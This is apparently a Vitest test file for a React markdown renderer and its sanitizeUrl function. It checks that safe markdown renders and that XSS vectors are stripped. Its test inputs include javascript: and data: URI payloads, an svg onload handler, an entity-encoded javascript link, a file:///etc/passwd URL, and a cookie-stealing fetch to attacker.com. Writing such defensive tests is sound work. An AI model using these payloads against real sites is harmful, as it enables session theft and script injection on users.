import { describe, it, expect, vi } from "vitest"
import { render, screen } from "@testing-library/react"
import RenderMarkdownContent, { sanitizeUrl } from "./renderMarkdown"

describe("sanitizeUrl", () => {
  describe("Safe URLs", () => {
    it("should allow http URLs", () => {
      const result = sanitizeUrl("http://example.com", "http")
      expect(result).toBe("http://example.com")
    })

    it("should allow https URLs", () => {
      const result = sanitizeUrl("https://example.com", "https")
      expect(result).toBe("https://example.com")
    })

    it("should allow mailto links", () => {
      const result = sanitizeUrl("mailto:test@example.com", "mailto")
      expect(result).toBe("mailto:test@example.com")
    })

    it("should allow relative URLs starting with /", () => {
      const result = sanitizeUrl("/path/to/page", "http")
      expect(result).toBe("/path/to/page")
    })

    it("should allow hash URLs starting with #", () => {
      const result = sanitizeUrl("#section", "http")
      expect(result).toBe("#section")
    })

    it("should trim whitespace from URLs", () => {
      const result = sanitizeUrl("  https://example.com  ", "https")
      expect(result).toBe("https://example.com")
    })
  })

  describe("JavaScript Protocol XSS", () => {
    it("should block javascript: protocol", () => {
      const result = sanitizeUrl("javascript:alert('XSS')", "http")
      expect(result).toBe("")
    })

    it("should block javascript: with uppercase", () => {
      const result = sanitizeUrl("JavaScript:alert('XSS')", "http")
      expect(result).toBe("")
    })

    it("should block javascript: with mixed case", () => {
      const result = sanitizeUrl("JaVaScript:alert('XSS')", "http")
      expect(result).toBe("")
    })

    it("should block javascript: with whitespace", () => {
      const result = sanitizeUrl("java script:alert('XSS')", "http")
      expect(result).toBe("")
    })

    it("should block complex javascript: payloads", () => {
      const payload = "javascript:void(fetch('http://attacker.com?cookie='+document.cookie))"
      const result = sanitizeUrl(payload, "http")
      expect(result).toBe("")
    })

    it("should block javascript: with newlines and tabs", () => {
      const result = sanitizeUrl("java\nscript:alert('XSS')", "http")
      expect(result).toBe("")
    })
  })

  describe("Data URI XSS", () => {
    it("should block data: URIs with HTML", () => {
      const result = sanitizeUrl(
        "data:text/html,<script>alert('XSS')</script>",
        "http"
      )
      expect(result).toBe("")
    })

    it("should block data: with base64 encoded script", () => {
      const result = sanitizeUrl(
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
        "http"
      )
      expect(result).toBe("")
    })

    it("should block data: URIs with uppercase", () => {
      const result = sanitizeUrl("DATA:text/html,<script>alert(1)</script>", "http")
      expect(result).toBe("")
    })

    it("should block data: with image/svg+xml and script", () => {
      const result = sanitizeUrl(
        "data:image/svg+xml,<svg onload=alert('XSS')>",
        "http"
      )
      expect(result).toBe("")
    })
  })

  describe("VBScript and Other Dangerous Protocols", () => {
    it("should block vbscript: protocol", () => {
      const result = sanitizeUrl("vbscript:msgbox('XSS')", "http")
      expect(result).toBe("")
    })

    it("should block file: protocol", () => {
      const result = sanitizeUrl("file:///etc/passwd", "http")
      expect(result).toBe("")
    })

    it("should block blob: protocol", () => {
      const result = sanitizeUrl("blob:http://example.com/malicious", "http")
      expect(result).toBe("")
    })
  })

  describe("Edge Cases", () => {
    it("should handle empty strings", () => {
      const result = sanitizeUrl("", "http")
      expect(result).toBe("")
    })

    it("should handle null/undefined by converting to string", () => {
      const result = sanitizeUrl(undefined as unknown as string, "http")
      expect(result).toBe("")
    })

    it("should handle non-string types", () => {
      const result = sanitizeUrl(123 as unknown as string, "http")
      expect(result).toBe("")
    })

    it("should allow URLs without protocols when protocol is not required", () => {
      const result = sanitizeUrl("example.com", "http")
      expect(result).toBe("example.com")
    })

    it("should handle URLs with query parameters", () => {
      const result = sanitizeUrl(
        "https://example.com/path?param=value&other=test",
        "https"
      )
      expect(result).toBe("https://example.com/path?param=value&other=test")
    })

    it("should handle URLs with fragments", () => {
      const result = sanitizeUrl("https://example.com/path#section", "https")
      expect(result).toBe("https://example.com/path#section")
    })
  })
})

describe("RenderMarkdownContent", () => {
  describe("Safe Markdown Rendering", () => {
    it("should render basic paragraph", () => {
      render(<RenderMarkdownContent content="Hello world" />)
      expect(screen.getByText("Hello world")).toBeInTheDocument()
    })

    it("should render heading", () => {
      render(<RenderMarkdownContent content="## Heading" />)
      const heading = screen.getByText("Heading")
      expect(heading.tagName).toBe("H2")
    })

    it("should render bold text", () => {
      render(<RenderMarkdownContent content="**Bold text**" />)
      const strong = screen.getByText("Bold text")
      expect(strong.tagName).toBe("STRONG")
    })

    it("should render italic text", () => {
      render(<RenderMarkdownContent content="*Italic text*" />)
      const em = screen.getByText("Italic text")
      expect(em.tagName).toBe("EM")
    })

    it("should render lists", () => {
      render(
        <RenderMarkdownContent content="- Item 1\n- Item 2\n- Item 3" />
      )
      const items = screen.getAllByText(/Item [123]/)
      expect(items).toHaveLength(3)
    })

    it("should render safe links with http protocol", () => {
      render(
        <RenderMarkdownContent content="[Link](https://example.com)" />
      )
      const link = screen.getByText("Link") as HTMLAnchorElement
      expect(link.href).toBe("https://example.com/")
      expect(link.target).toBe("_blank")
      expect(link.rel.toString()).toContain("noopener")
      expect(link.rel.toString()).toContain("noreferrer")
    })

    it("should render relative links without target blank", () => {
      render(
        <RenderMarkdownContent content="[Internal](/about)" />
      )
      const link = screen.getByText("Internal") as HTMLAnchorElement
      expect(link.href).toContain("/about")
      expect(link.target).toBe("")
    })

    it("should render code blocks", () => {
      render(
        <RenderMarkdownContent content="`const x = 1`" />
      )
      const code = screen.getByText("const x = 1")
      expect(code.tagName).toBe("CODE")
    })

    it("should render blockquotes", () => {
      render(
        <RenderMarkdownContent content="> This is a quote" />
      )
      const quote = screen.getByText("This is a quote")
      expect(quote.closest("blockquote")).toBeInTheDocument()
    })

    it("should render safe images", () => {
      render(
        <RenderMarkdownContent content='![Alt text](https://example.com/image.png "Image Title")' />
      )
      const img = screen.getByAltText("Alt text") as HTMLImageElement
      expect(img.src).toBe("https://example.com/image.png")
      expect(img.title).toBe("Image Title")
    })
  })

  describe("Script Tag XSS Prevention", () => {
    it("should strip script tags from markdown", () => {
      const content = "Normal text\n<script>alert('XSS')</script>\nMore text"
      render(<RenderMarkdownContent content={content} />)
      expect(screen.getByText("Normal text")).toBeInTheDocument()
      expect(screen.getByText("More text")).toBeInTheDocument()
      expect(screen.queryByText("alert('XSS')")).not.toBeInTheDocument()
    })

    it("should strip embedded script tags", () => {
      const content = "Click <script>alert('clicked')</script> here"
      render(<RenderMarkdownContent content={content} />)
      expect(screen.getByText(/Click.*here/)).toBeInTheDocument()
    })

    it("should strip multiple script tags", () => {
      const content = "<script>var x=1</script>Safe content<script>var y=2</script>"
      render(<RenderMarkdownContent content={content} />)
      expect(screen.getByText("Safe content")).toBeInTheDocument()
    })
  })

  describe("Link XSS Prevention", () => {
    it("should block javascript: links", () => {
      render(
        <RenderMarkdownContent content="[Click me](javascript:alert('XSS'))" />
      )
      const link = screen.getByText("Click me") as HTMLAnchorElement
      expect(link.href).not.toContain("javascript:")
    })

    it("should block data: URIs in links", () => {
      render(
        <RenderMarkdownContent content='[Link](data:text/html,<script>alert("XSS")</script>)' />
      )
      const link = screen.getByText("Link") as HTMLAnchorElement
      expect(link.href).not.toContain("data:")
    })

    it("should render link with title attribute", () => {
      render(
        <RenderMarkdownContent content='[Link](https://example.com "Title")' />
      )
      const link = screen.getByText("Link") as HTMLAnchorElement
      expect(link.title).toBe("Title")
    })
  })

  describe("Image XSS Prevention", () => {
    it("should block javascript: URIs in images", () => {
      render(
        <RenderMarkdownContent content='![Alt](javascript:alert("XSS"))' />
      )
      expect(screen.queryByAltText("Alt")).not.toBeInTheDocument()
    })

    it("should block data: URIs in images", () => {
      render(
        <RenderMarkdownContent content='![Alt](data:text/html,<script>alert("XSS")</script>)' />
      )
      expect(screen.queryByAltText("Alt")).not.toBeInTheDocument()
    })

    it("should render safe image URLs", () => {
      render(
        <RenderMarkdownContent content="![Alt](https://example.com/safe.png)" />
      )
      const img = screen.getByAltText("Alt") as HTMLImageElement
      expect(img.src).toContain("example.com/safe.png")
    })

    it("should handle missing images gracefully", () => {
      render(
        <RenderMarkdownContent content="![Alt]()" />
      )
      expect(screen.queryByAltText("Alt")).not.toBeInTheDocument()
    })
  })

  describe("HTML Tag XSS Prevention", () => {
    it("should strip iframe tags", () => {
      const content = 'Text <iframe src="javascript:alert(\'XSS\')"></iframe> more'
      render(<RenderMarkdownContent content={content} />)
      expect(screen.queryByTitle("javascript:alert('XSS')")).not.toBeInTheDocument()
    })

    it("should strip onclick event handlers", () => {
      const content = '<div onclick="alert(\'XSS\')">Click</div>'
      render(<RenderMarkdownContent content={content} />)
    })

    it("should strip style tags", () => {
      const content = '<style>body { background: red; }</style>Text'
      render(<RenderMarkdownContent content={content} />)
      expect(screen.getByText("Text")).toBeInTheDocument()
    })

    it("should strip svg with onload handlers", () => {
      const content = '<svg onload="alert(\'XSS\')"></svg>Safe'
      render(<RenderMarkdownContent content={content} />)
      expect(screen.getByText("Safe")).toBeInTheDocument()
    })
  })

  describe("Complex XSS Payloads", () => {
    it("should prevent stored XSS via encoded characters", () => {
      const content =
        "Click [here](jav&#x61;script:alert('XSS')) for details"
      render(<RenderMarkdownContent content={content} />)
      const link = screen.getByText("here") as HTMLAnchorElement
      expect(link.href).not.toContain("javascript")
    })

    it("should prevent XSS via nested encoding", () => {
      const content = '[test](data%3Atext/html%3C/script%3E)'
      render(<RenderMarkdownContent content={content} />)
    })

    it("should handle markdown with mixed safe and unsafe content", () => {
      const content = `
# Safe Title
Regular paragraph with **bold** and *italic*.
[Safe Link](https://example.com)
<script>alert('XSS')</script>
![Safe Image](https://example.com/img.jpg)
[Bad Link](javascript:void(0))
`
      render(<RenderMarkdownContent content={content} />)
      expect(screen.getByText("Safe Title")).toBeInTheDocument()
      expect(screen.getByText("Regular paragraph with")).toBeInTheDocument()
      expect(screen.getByAltText("Safe Image")).toBeInTheDocument()
    })
  })

  describe("Element Allowlist Enforcement", () => {
    it("should render all allowed heading levels", () => {
      const content = `
# H1
## H2
### H3
#### H4
##### H5
###### H6
`
      render(<RenderMarkdownContent content={content} />)
      expect(screen.getByText("H1").tagName).toBe("H1")
      expect(screen.getByText("H2").tagName).toBe("H2")
      expect(screen.getByText("H6").tagName).toBe("H6")
    })

    it("should render table elements", () => {
      const content = `
| Header 1 | Header 2 |
|----------|----------|
| Data 1   | Data 2   |
`
      render(<RenderMarkdownContent content={content} />)
      expect(screen.getByText("Header 1")).toBeInTheDocument()
      expect(screen.getByText("Data 1")).toBeInTheDocument()
    })

    it("should render strikethrough and inserted text", () => {
      const content = "~~Deleted~~ and ~~more~~"
      render(<RenderMarkdownContent content={content} />)
      const deleted = screen.getByText("Deleted")
      expect(deleted.tagName).toBe("DEL")
    })

    it("should render hr elements", () => {
      const { container } = render(
        <RenderMarkdownContent content="Text\n\n---\n\nMore text" />
      )
      const hr = container.querySelector("hr")
      expect(hr).toBeInTheDocument()
    })
  })

  describe("External Link Security", () => {
    it("should add target=blank and rel attributes to external links", () => {
      render(
        <RenderMarkdownContent content="[External](https://other-site.com)" />
      )
      const link = screen.getByText("External") as HTMLAnchorElement
      expect(link.target).toBe("_blank")
      expect(link.rel.toString()).toContain("noopener")
      expect(link.rel.toString()).toContain("noreferrer")
    })

    it("should not add target=blank to relative links", () => {
      render(
        <RenderMarkdownContent content="[Internal](/path)" />
      )
      const link = screen.getByText("Internal") as HTMLAnchorElement
      expect(link.target).toBe("")
    })

    it("should not add target=blank to mailto links", () => {
      render(
        <RenderMarkdownContent content="[Email](mailto:test@example.com)" />
      )
      const link = screen.getByText("Email") as HTMLAnchorElement
      expect(link.target).toBe("")
    })

    it("should not add target=blank to hash links", () => {
      render(
        <RenderMarkdownContent content="[Section](#top)" />
      )
      const link = screen.getByText("Section") as HTMLAnchorElement
      expect(link.target).toBe("")
    })
  })

  describe("Regression Tests", () => {
    it("should handle empty content", () => {
      const { container } = render(<RenderMarkdownContent content="" />)
      expect(container.firstChild).toBeInTheDocument()
    })

    it("should handle whitespace-only content", () => {
      const { container } = render(
        <RenderMarkdownContent content="   \n\n   " />
      )
      expect(container.firstChild).toBeInTheDocument()
    })

    it("should not render without dangerouslySetInnerHTML", () => {
      const spy = vi.spyOn(console, "warn")
      render(<RenderMarkdownContent content="**Safe content**" />)
      expect(screen.getByText("Safe content")).toBeInTheDocument()
      spy.mockRestore()
    })
  })
})
